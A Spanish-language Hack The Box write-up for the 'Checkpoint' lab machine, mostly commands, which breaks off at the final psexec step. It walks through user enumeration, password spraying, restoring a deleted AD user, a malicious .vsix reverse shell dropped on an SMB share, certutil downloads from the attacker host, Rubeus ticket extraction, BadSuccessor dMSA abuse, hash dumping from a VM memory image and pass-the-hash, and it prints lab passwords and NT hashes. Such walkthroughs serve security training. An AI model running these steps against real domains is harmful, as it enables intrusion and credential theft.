---
layout: single
title: Checkpoint - Hack The Box
excerpt: "Esta máquina tiene de objetivo aprender a explotar el ataque BadSuccesor, que para ello tenemos que ir realizando las siguientes acciones en cadena. Primero, descubrimos un usuario que esta eliminado pero como nuestro usuario inicial tiene permisos de escritura sobre objetos eliminados lo habilita. Este usuario habilitado tiene permisos de escritura sobre un share cual acepta archivos en .vsix para visual code, que abusaremos de esto para darnos la intrusión a la máquina de otro usuario, tras esto, con Rubeus nos generamos un TGT (Ticket Granting Ticket) para abusar de la delegación y posteriormente, crear un usuario dMSA abusando del ataque *BadSuccesor*, tras esto, podremos acceder a otro share forense que contiene componentes de VMware entre ellos el .vmem cual nos permitirá extraer los registry.HiveList y seguidamente dumpear los hashes SAM. Por último, accedemos a nivel sistema como Autoridad del sistema mediante Pass The Hash con psexec."
date: 2026-09-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-checkpoint/Pasted image 20260912203840.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - Active Directory
tags:
  - writeup
  - TombstoneReanimationAttack
  - ReverseShell-vsix
  - TGTdelegationAbuse
  - BadSuccessor
  - PassTheTicket
  - CVE-2025-53779
  - Forensic-memoryVMware
  - DumpHashes
  - PassTheHash
---

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260912203840.png)


## WRITE UP
IP VÍCITMA->  10.129.95.254  (TTL 127) WINDOWS


### RECONOCIMIENTO
Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Checkpoint</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

>Credenciales iniciales como una auditoria real de pentesting: <span style="color:blue">alex.turner</span>:<span style="color:darkred">Checkpoint2024!</span>

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem 10.129.95.254
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915012214.png)


-Usar el comando *ping*:
```bash
ping 10.129.95.254 -c 1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915012245.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.95.254 -oG allPorts
# Veremos porque el formato grepeable, es importante.
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915012435.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports allPorts
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915012450.png)


```bash
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49669,49671,49679,49680,49688,49709,49711 10.129.95.254 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915012604.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915012712.png)

### RESOLUCIÓN NOMBRES LOCAL
Antes que nada vamos al fichero <span style="color:lightblue">/etc/</span>**hosts** para asociar las IPs a los nombres, FQDN o nombre de dominio. Y no tener que recordar las IPs a cada rato.

```bash
nxc smb 10.129.95.254 -u "alex.turner" -p 'Chekpoint2024!'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915013227.png)

```bash
sudo nano /etc/hosts
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915013406.png)


### ANÁLISIS KERBEROS: 88 RECONOCIMIENTO
Como tenemos el puerto de kerberos abierto, podemos usar la herramienta *Kerbrute* para hacer un ataque de fuerza bruta a usuarios y descubrir posibles usuarios potenciales.

```bash
kerbrute userenum --dc 10.129.95.254 -d checkpoint.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915013804.png)

Aunque después de dejarlo en paralelo, no descubrirá ninguna interesante.


### ANÁLISIS SMB: 445 RECONOCIMIENTO
Empezaremos con la enumeración de samba con *netexec* por enumeración a nivel usuarios del dominio y a su vez, ver la descripción de los mismos para ver si guardan algún tipo de información.

Nos llama la atención la cuenta de servicio: <span style="color:blue">svc_deploy</span>

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915014327.png)

Enumeramos los grupos del dominio:

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915014528.png)

Ahora listamos los shares como el usuario <span style="color:blue">alex.turner</span> para ver si tenemos en alguno con permisos de lectura o escritura.

Tenemos permisos de lectura sobre el share <span style="color:lightblue">DevDrop</span> pero hay otro llamado <span style="color:lightblue">VMBackups</span> al que no podemos acceder. Nos da una idea a que grupo necesitamos pertenecer para poder acceder a cada uno.

<span style="color:lightblue">DevDrop</span> el grupo **DevTeam**.

<span style="color:lightblue">VMBackups</span> el grupo **BackupAccess**.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915014803.png)

Nos conectamos con *smbclient* para ver su contenido pero no habrá nada de contenido.

```bash
smbclient //DC01/DevDrop -U 'alex.turner%Checkpoint2024!'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915015312.png)

### PROBAR PASSWORD SPRAYING
Como tenemos una contraseña válida a nivel usuario probaremos un *Password Spraying* con *netexec* para ver si algún otro usuario usase la misma contraseña.

Para ello, primero creo una un diccionario con los usuarios enumerados por samba disponibles en el dominio, le pido a la IA que me haga la lista:

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915015920.png)

Empiezo el **Password Spraying**:

```bash
nxc smb dc01 -u "wordlists_users.txt" -p 'Checkpoint2024!' --continue-on-success --no-bruteforce
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915020030.png)

Nos saldrá un error de conexión debido a que la NETBIOS con el host remoto no ha llegado. Igualmente ninguna credencial será válida.

Aprovechando que tenemos un diccionario con usuario o un usuario válido, comprobaremos los ataques *ASREProasting* y *Kerberoasting* para ver si funcionan.

**ASREProasting:**

No es vulnerable.

```bash
impacket-GetNPUsers -no-pass -usersfile wordlists_users.txt -dc-ip 10.129.95.254 -request -format hashcat -outputfile asrep_hashes.txt checkpoint.htb/
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915022548.png)


**Kerberoasting:**

No es vulnerable.

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.95.254 -outputfile kerberoast_hashes.txt 'checkpoint.htb/alex.turner:Checkpoint2024!'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915022622.png)


### ANÁLISIS WINRM: 5985 RECONOCIMIENTO
Intentamos validar las credenciales actuales por *WINRM* haber si nos lo permite, pero no hay éxito.

```bash
nxc winrm dc01 -u "wordlists_users.txt" -p 'Checkpoint2024!'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915021601.png)


### ANÁLISIS LDAP: 389, 636, 3268, 3269 RECONOCIMIENTO
Teniendo *LDAP* vamos a probar a enumerar por aquí haber si conseguimos algún que otro dato interesante en cuanto a información del dominio respecta.

```bash
# Enumerar el dominio a nivel de enumeración con credenciales y lo exporta via HTML
ldapdomaindump -u 'checkpoint.htb\alex.turner' -p 'Checkpoint2024!' 10.129.95.254
```

Nos da error debido a que el DC01 no acepta peticiones de LDAP sin firmar.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915020611.png)


### BLOODHOUND
Si no nos deja lo anterior posiblemente si intentamos usar *bloodhound* nos salga un error por LDAP.

```bash
bloodhound-python -u 'alex.turner' -p 'Checkpoint2024!' -ns 10.129.95.254 -d checkpoint.htb -c All --zip 
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915021011.png)


### BLOODYAD
Para buscar otra vía de ataque, usamos la herramienta *bloodyAD* que nos va a permitir hacer peticiones por LDAP firmado obteniendo información extra del dominio como a que objetos tenemos ciertos permisos y demás.

Consultamos los permisos de escritura del usuario <span style="color:blue">alex.turner</span> sobre cualquier objeto.

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.95.254 get writable --detail
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915022723.png)

Nos encuentra que tenemos un **DACL** *(lista que define qué usuarios o grupos tienen permiso para acceder o modificar un objeto específico)* de escritura sobre objetos eliminados, esto es muy crítico debido a que podemos habilitar objetos eliminados. Así que vamos haber si hay alguno que haya sido eliminado.

### Buscar objetos eliminados: Tombstone Reanimation Attack - Mark Davies
El ataque **Tombstone Reanimation Attack** consiste en aprovechar un permiso mal configurado para **resucitar ("reanimar") un objeto eliminado** (como una cuenta de usuario o computadora administrador) que aún se encuentra en un estado temporal de eliminación conocido como _"Tombstone"_ (lápida).


Nos encuentra al usuario <span style="color:blue">Mark Davies</span> en objetos eliminados.

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.95.254 get children --target 'CN=Deleted Objects,DC=chekpoint,DC=htb'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915023221.png)

Ahora viene lo que mencione anteriormente, es que al tener permisos de escritura podemos "reanimar" a este usuario y tener los permisos que tuviese antes de su eliminación.

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.95.254 set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915024610.png)

Podemos probar a listar todos los usuarios y a los grupos a los que perteneces y Unidad Organizativa (Nos listará su Distinguished Name o DN):

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.95.254 get search --filter '(objectClass=user)' --attr sAMAccountName,memberOf
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915025106.png)

>Para el usuario <span style="color:blue">Mark Davies</span> su SAM account es <span style="color:blue">mark.davies</span>.

### VÁLIDAMOS USUARIO RESTAURADO
Como solo tenemos una contraseña a nivel validación del dominio la usaremos para intentar autenticar a <span style="color:blue">mark.davies</span> con ella y ver si la acepta.

Tenemos éxito y son válidas las credenciales.

```bash
# VÁLIDAR USUARIO POR SAMBA
nxc smb dc01 -u 'mark.davies' -p 'Checkpoint2024!'

# VÁLIDAR USUARIO POR WINRM
nxc winrm dc01 -u 'mark.davies' -p 'Checkpoint2024!'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915025442.png)


### UPLOAD MALICIOUS .vsix FILE: REVERSE SHELL
Como tenemos un nuevo usuario a nivel dominio listaremos los shares para ver si podemos abusar de alguno.

Tenemos permisos de escritura sobre <span style="color:lightblue">DevDrop</span> eso quiere decir que podemos subir cosas en el. Leyendo la descripción del share nos dice que permite la subida de archivos **.vsix**, más adelante veremos que son y para que sirven.

```bash
nxc smb dc01 -u 'mark.davies' -p 'Checkpoint2024!' --shares
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915025703.png)

Me conecto pero no veo nada interesante.

```bash
smbclient //DC01/DevDrop -U 'mark.davies%Checkpoint2024!'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915030653.png)


### ¿QUE SON LOS ARCHIVOS .vsix?
Una rápida búsqueda en Google nos dirá la respuesta:

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915030156.png)


Esto nos da a pensar que detrás del share a nivel sistema, hay un usuario que esta manejando los archivos que se suben a este share y tal vez con un archivo **.vsix** malicioso compatible con el <span style="color:yellow">VS code engine v1.118.0</span> podamos darnos una <span style="color:lime">reverse shell</span> y ganar la intrusión al sistema del usuario que haya detrás.

Vamos hacerlo de 2 formas, la primera de forma "manual" y la segunda tirando de un repositorio de Github.

**1º FORMA: MANUAL**
Para esta forma lo primero que necesitaremos es clonar el siguiente repositorio de GitHub:

>https://github.com/trailofbits/vsix-zoo

Nos iremos a la siguiente ruta y moveremos los archivos **extension.js** y **package.json** a un directorio independiente llamado <span style="color:lightblue">extensionspack</span>.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915031652.png)


Creamos la siguiente estructura:

Dentro de <span style="color:lightblue">extensionspack</span> otra carpeta llamada <span style="color:lightblue">extension</span> y ahí irán esos archivos.

```bash
tree .
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915031958.png)


Modificamos el archivo **extension.js** que va a ser el que va a contener la <span style="color:lime">reverse shell</span>, definiendo los campos de nuestra IP de atacante y puerto que queremos ponernos a la escucha.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915032058.png)


Seguidamente en <span style="color:lightblue">extensionspack</span> creamos los archivos **[Content_Types].xml** y **extension.vsixmanifest**:

Quedándonos esta estructura básica y simple para que funciona este tipo de archivos .vsix.

```bash
tree .
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915032635.png)


Le pedí a la IA que me dijese el contenido de estos dos archivos, adaptado al **package.json**
y que tenga en cuenta que tenía que ser compatible con la versión de <span style="color:yellow">VS code engine v1.118.0</span>.

```bash
# extension.vsixmanifest
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest
    Version="2.0.0"
    xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">

    <Metadata>
        <Identity
			Id="zeron-cysec"
			Version="0.0.1"
			Language="en-US"
			Publisher="Zeron-CySec" />

		<DisplayName>ZeronCySec</DisplayName>
		
		<Description xml:space="preserve">
			Proof Of Concept
		</Description>
		
		<Categories>Other</Categories>
		
		<Tags>cybersecurity;security;zeron;cysec</Tags>
		
		<Properties>
			<Property
				Id="Microsoft.VisualStudio.Code.Engine"
				Value="^1.118.0" />
		</Properties>
</Metadata>

<Installation>
	<InstallationTarget
		Id="Microsoft.VisualStudio.Code" />
</Installation>

<Dependencies />

<Assets>
	<Asset
		Type="Microsoft.VisualStudio.Code.Manifest"
		Path="extension/package.json"
		Addressable="true" />
</Assets>

</PackageManifest>
```

```bash
# [Content_Types].xml
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">

	<Default
		Extension="vsixmanifest"
		ContentType="text/xml" />
	
	<Default
		Extension="json"
		ContentType="application/json" />
	
	<Default
		Extension="js"
		ContentType="application/javascript" />
	
	<Default
		Extension="ts"
		ContentType="application/javascript" />
	
	<Default
		Extension="md"
		ContentType="text/markdown" />
	
	<Default
		Extension="txt"
		ContentType="text/plain" />

</Types>
```


Ya teniendo todo creado y configurado, al ser un formato comprimido, se comprime y la salida del archivo se guarda como <span style="color:orange">extensionspack.vsix</span>.

```bash
zip -r extensionspack.vsix extensionspack
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915032736.png)


Nos ponemos a la escucha por el <span style="color:purple">puerto 4444</span> que es el que habíamos puesto anteriormente con *netcat*, para que cuando subamos dicho archivo comprimido recibir el host víctima.

```bash
nc -nlvp 4444
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915033654.png)


Nos conectamos al recurso compartido en red <span style="color:lightblue">DevDrop</span> como <span style="color:blue">mark.davies</span> y subimos el archivo comprimido.

```bash
# Conectarse al share DevDrop como mark.davies
smbclient //DC01/DevDrop -U 'mark.davies%Checkpoint2024!'

# Subimos el archivo comprimido al share
put extensionspack.vsix
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915032855.png)


De forma paralela, en poco tiempo recibiremos la reverse shell a nuestro *netcat*, ganando intrusión al sistema y estaremos como el usuario <span style="color:blue">ryan.brooks</span>.

```bash
# Saber el usuario de la sesión actual
whomai
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915045710.png)


**2ºFORMA: REPOSITORIO GITBHUB**
Esta segunda forma será más automatizada debido a que solo tendremos que ejecutar un archivo de python y recibiremos directamente el archivo .vsix directamente.

Nos vamos al siguiente repositorio de GitHub:

>https://github.com/Goultarde/vsix_revshell.py

Nos dirigimos al archivo <span style="color:grey">vsix.revshell.py</span> y copiamos el código.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034125.png)


Metemos el código dentro de un archivo de python llamado **create_plugin.py**.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034256.png)


Nos ponemos a la escucha por el <span style="color:purple">puerto 4444</span> que es el que habíamos puesto anteriormente con *netcat*, para que cuando subamos dicho archivo comprimido recibir el host víctima.

```bash
nc -nlvp 4444
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034330.png)


Ejecutamos el archivo junto a los parámetros donde definimos nuestra IP de atacante y puerto que nos pusimos a la escucha anteriormente.

```bash
python3 create_plugin.py -i 10.10.15.122 -p 4444
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034423.png)


Nos dejará directamente un archivo que contiene la reverse shell: <span style="color:lime">revshell.vsix</span>
Subimos el archivo comprimido al share.

```bash
# Conectarse al share DevDrop como mark.davies
smbclient //DC01/DevDrop -U 'mark.davies%Checkpoint2024!'

# Subimos el archivo comprimido al share
put extensionspack.vsix
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034558.png)


De forma paralela recibiremos la conexión de la víctima igual que en la primera forma.

```bash
whoami
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034622.png)


### BANDERA USUARIO: RYAN.BROOKS
Para coger la bandera del usuario, nos dirigimos al directorio personal de <span style="color:blue">ryan.brooks</span>, en su escritorio estará la bandera <span style="color:orange">user.txt</span> .

```bash
# Ir al escritorio del usuario ryan.brooks
cd C:\Users\ryan.brooks\Desktop\

# Leer bandera de usuario
type user.txt
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034744.png)


Como había un share llamado <span style="color:lightblue">VMBackups</span> cual no teníamos permisos ni lectura o escritura sobre el con ningún usuario válido visto anteriormente, nos iremos a nivel sistema para ver si nos deja acceder.

```bash
cd C:\Shares\VMBackups
```

No podremos interactuar con el.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915034910.png)


### GENERATE FAKE DELEGATION TGT (Ticket Granting Ticket)
Lo que haremos en este punto es generar un TGT del usuario actual con la herramienta *Rubeus*, para autenticarnos y realizar acciones sin conocer la contraseña del usuario actual ante kerberos realizando un *Pass The Ticket* cargado dicho ticket en memoria.

>https://github.com/gzzcoo/Rubeus

Para ello nos bajamos el binario del repositorio anterior, y nos abrimos un *servidor HTTP en python*.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035205.png)


Nos pasaremos el binario a Windows con le herramienta nativa *certutil* de Windows.

```bash
certutil.exe -urlcache -f http://10.10.15.122:8000/Rubeus.exe .\Rubeus.exe
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035421.png)


Para generar el **fake delegation**, se solicita un TGS para un SPN (por ejemplo, `cifs/://domain.com`) y durante ese proceso la API de Windows construye un mensaje **AP-REQ** que contiene, además del TGS, una copia cifrada del TGT del usuario actual para permitir la delegación.

Rubeus intercepta ese AP-REQ durante la negociación GSS-API, y para poder extraer el TGT lo descifra usando la **session key del TGS**, que ya está disponible en la caché local sin necesidad de privilegios. El resultado es el TGT del usuario actual en formato base64 listo para usar, sin haber tocado LSASS en ningún momento.

>El TGT es **legítimo**, lo que es **falsa** es la delegación que se usa como pretexto para que Windows lo meta en el AP-REQ. Por eso no es lo mismo que un *Golden Ticket* porque este es falso y no lo solicita al KDC.

```bash
./Rubeus.exe tgtdeleg /nowrap
# /nowrap: De forma predeterminada, Rubeus formatea el ticket extraído en Base64 dividiéndolo en varias líneas de 80 caracteres para que sea más fácil de leer en la consola. Al añadir este parametro le dices a Rubeus que muestre toda la cadena Base64 en una sola línea continua.
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035542.png)


Cogemos el TGT en base64 y lo pasamos a un archivo <span style="color:pink">.kirbi</span>.

```bash
echo 'TGTenB64' > ryan.b64.kirbi
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035647.png)


Desciframos el TGT de base64 y lo pasamos limpio a otro archivo. Necesitamos convertirlo a un formato que las herramientas de Linux como Impacket puedan usar.

```bash
cat ryan.b64.kirbi | base64 -d > ryan.kirbi
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035801.png)


Con *ticketConverter* convertiremos el ticket <span style="color:pink">.kirbi</span> a un <span style="color:green">.ccache</span> para poder usarlo en memoria.

```bash
impacket-ticketConverter ryan.kirbi ryan.ccache
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035823.png)


### EXPORTAR TICKET KERBEROS EN MEMORIA:  .ccache
Exportamos el TGT (**Ticket-Granting Ticket**) del usuario actual en memoria a través de la  variable de entorno `KRB5CCNAME`, para poder hacer *Pass The Ticket* a consultas sin necesidad de conocer la contraseña, que es lo más cómodo de esta técnica.

```bash
# Exportar ticket en memoria
export KRB5CCNAME=ryan.ccache

# Listar tickets de kerberos actualmente en uso en la memoria
klist
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915035911.png)


### VALIDACIÓN DE USUARIO: PASS THE TICKET
Vamos a validar el usuario mediante el TGT de kerberos con *netexec* a nivel de samba. Nos lo acepta teniendo a <span style="color:blue">ryan.brooks</span> como autenticación válida en el dominio.

```bash
faketime '2026-09-15 11:08:40' nxc smb dc01 -k --use-kcache -d checkpoint.htb
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915040904.png)

A continuación veremos el porque del comando **faketime**.


### BADSUCCESSOR: CREACIÓN DE dMSA HEREDANDO PERMISOS DE svc_deploy
**BadSuccessor** **(CVE-2025-53779)** es una vulnerabilidad crítica descubierta en 2025 que afecta a entornos Active Directory con controladores de dominio Windows Server 2025. El fallo reside en que un usuario con permisos de escritura sobre una OU que contenga cuentas dMSA **y** permisos de escritura sobre el objeto de una cuenta de servicio privilegiada del dominio, heredando automáticamente sus permisos sin necesidad de conocer sus credenciales. 

Esto permite a un atacante con privilegios mínimos escalar hasta el nivel de cualquier cuenta de servicio del dominio, convirtiéndola en una vía de escalada de privilegios especialmente peligrosa en entornos donde Windows Server 2025 actúa como DC. Y si recordamos la captura de reconocimiento por samba, cumplimos el requisito del sistema operativo y versión.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260916024234.png)

Respecto al tiempo, Kerberos rechaza tickets con diferencia horaria superior a 5 minutos, por lo que sincronizamos el horario del DC con nuestra máquina de atacantepara evitar estos problemas.

```bash
sudo ntpdate checkpoint.htb
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915040254.png)


### BLOODYAD: BUSCAR PERMISOS DE ESCRITURA SOBRE OBJETO
Con *bloodyAD* haremos una consulta sobre que objetos tenemos permisos de escritura, usando el ticket previamente exportado como <span style="color:blue">ryan.brooks</span>.

Nos dice que tenemos sobre la cuenta de servicio <span style="color:blue">svc_deploy</span>. Esto es muy buena señal, lo explicare más adelante.

```bash
faketime '2026-09-15 11:01:49' bloodyAD -k ccache=ryan.ccache -d checkpoint.htb --host dc01.checkpoint.htb --dc-ip 10.129.95.254 get writable --right WRITE
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915040326.png)


### COMPROBAR QUE ES VULNERABLE A BADSUCCESOR
Con *netexec* usamos el módulo **badsuccesor:**

```bash
nxc ldap dc01 -u "alex.turner" -p 'Checkpoint2024!' -M badsuccessor
```

Parece que tenemos suerte, porque <span style="color:blue">ryan.brooks</span> con `OU=MSAHolder`, nos está diciendo que esa OU existe y está configurada para contener cuentas dMSA, lo que confirma que el entorno es **vulnerable a BadSuccessor** y cumplimos el requisito de poder escribir sobre la cuenta de servicio <span style="color:blue">svc_deploy</span>, porque en caso contrario no podríamos hacer nada.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915041151.png)


### EJECUCIÓN ATAQUE: BADSUCCESOR
Crearemos un usuario **dMSA** (Delegated Managed Service Account) que es un tipo de cuenta de servicio introducida en Windows Server 2025 que hereda automáticamente los permisos de otra cuenta de servicio existente, en este caso `svc_deploy`, tenemos permisos de escritura sobre ese objeto. El ataque **BadSuccessor** abusa de una mala configuración en la que un usuario sin privilegios especiales puede crear un dMSA en la OU `MSAHolder` y vincularlo a la cuenta de servicio <span style="color:blue">svc_deploy</span>.

```bash
faketime '2026-09-15 11:19:47' bloodyAD -k ccache=ryan.ccache -d checkpoint.htb --host dc01.checkpoint.htb --dc-ip 10.129.95.254 add badSuccessor evidMSA6 -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=MSAHolder,DC=checkpoint,DC=htb"
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915042402.png)

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915042549.png)


### PASS THE HASH: SVC_DEPLOY
Si nos hemos fijado en la salida del comando anterior, una vez explotado BadSuccessor y creado el **dMSA** vinculado a <span style="color:blue">svc_deploy</span>, nos devuelve el **hash RC4 del dMSA**, que al haber heredado los permisos de esta cuenta de servicio, podemos usarlo directamente mediante *Pass The Hash*.

Validamos a la cuenta de servicio haciendo **Pass The Hash** por samba, siendo válido sin problemas.

```bash
nxc smb dc01 -u 'svc_deploy' -H 'e16081eb077aca74bdbf8af12af43ac9'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915043346.png)


### TGT: dMSA user
Si listamos los archivos de nuestro directorio actual, nos habrá dejado el TGT del usuario dMSA user creado anteriormente, y como tenemos los permisos de svc_deploy es otra forma de abusar a nivel de permisos.

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915043404.png)

Nos cargamos el ticket en memoria y verificamos que funciona mediante *netexec* haciendo un Pass The Ticket.

```bash
# Exportar ticket TGT en memoria
export KRB5CCNAME=dMSAuser_J7.ccache

# Listar los Tickets de Kerberos en uso en la memoria
klist

# Validar usuario dMSAuser con Pass The Ticket
faketime '2026-09-15 11:24:53' nxc smb dc01 -k --use-kcache -d checkpoint.htb
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915042716.png)

Es válido.


### ACCESO A SHARE: VMBackups
Probamos a listar shares **(Enseño las dos formas que tenemos disponibles, tanto para listar y conectarse)**, y nos dice que tenemos el share <span style="color:lightblue">VMBackups</span> con permisos de lectura.

```bash
# Listar shares como dMSA user mediante Pass The Ticket
faketime '2026-09-15 11:29:53' nxc smb dc01 -k --use-kcache -d checkpoint.htb --shares

# Listar shares como svc_deploy mediante Pass The Hash
nxc smb dc01 -u 'svc_deploy' -H 'e16081eb077aca74bdbf8af12af43ac9' --shares
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915043207.png)

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915043542.png)


Nos conectamos de la forma más cómoda que veamos, y explorando, vemos que se trata de un directorio forense con componentes de VMware, entre ellos podemos destacar el *.vmem* que nos permitirá poder extraer información, procesos, etc de la memoria RAM de una máquina virtual (Hypervisor VMware) en un momento específico.

Nos descargamos el archivo de memoria 'Windows Server 2019-Snapshot1.vmem'.

```bash
# Conectarse a share como dMSA user mediante Pass The Ticket 
faketime '2026-09-15 11:38:08' impacket-smbclient -k -no-pass dc01.checkpoint.htb

# Conectarse a share como svc_deploy mediante Pass The Hash
smbclient //DC01/VMBackups -U 'svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash

# Descargamos la copia de la Memoria RAM del VMware
get Windows Server 2019-Snapshot1.vmem
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915044000.png)

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915044335.png)


### FORENSE: EXTRACCIÓN REGISTRYS DE WINDOWS DE LA MEMORIA RAM
Usando *Volatility3* con el plugin `windows.registry.hivelist.HiveList`, extraemos la lista de colmenas del registro de Windows que estaban cargadas en memoria

```bash
vol -f 'Windows Server 2019-Snapshot1.vmem' windows.registry.hivelist.HiveList --dump
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915044532.png)

>[Artículo sobre los Resgistry](https://learn.microsoft.com/es-es/windows/win32/sysinfo/structure-of-the-registry)


Después con *SecretsDump* leerá primero el archivo **SYSTEM** para extraer la bootkey, que es la clave maestra con la que el sistema cifra las credenciales, y la usa para descifrar el archivo **SAM** obteniendo los hashes NTLM de todas las cuentas locales, y el archivo **SECURITY** obteniendo los LSA Secrets como credenciales cacheadas y claves de servicio, devolviendo todo en texto plano con el formato `usuario:RID:lmhash:nthash`.

```bash
impacket-secretsdump -sam registry.SAM.0xc30a3278e000.hive -system registry.SYSTEM.0xc30a2fe38000.hive -security registry.SECURITY.0xc30a32789000.hive LOCAL
# LOCAL: Le dice que trabaje con archivos locales en lugar de conectarse a un sistema remoto.
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915044617.png)

### PASS THE HASH: VÁLIDAR USUARIO
Validamos que tenemos autenticación a nivel dominio con el <span style="color: blue">Administrador</span> mediante su hash NTLM.

Nos lo validará, y dirá <span style="color:yellow">(Pwned!)</span> eso querrá decir que al ser administradores tenemos privilegios sobre DC01.

```bash
nxc smb dc01 -u 'administrator' -H 'f29e9c014295b9b32139b09a2790be3b'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915044651.png)


### ACCESO REMOTO: AUTHORITY SYSTEM
Como ya tenemos el hash del <span style="color: blue">Administrador</span> vamos a conectarnos mediante *psexec* haciendo un *Pass The Hash* y nos convertiremos en <span style="color:blue">Authority\system</span> del DC01.

```bash
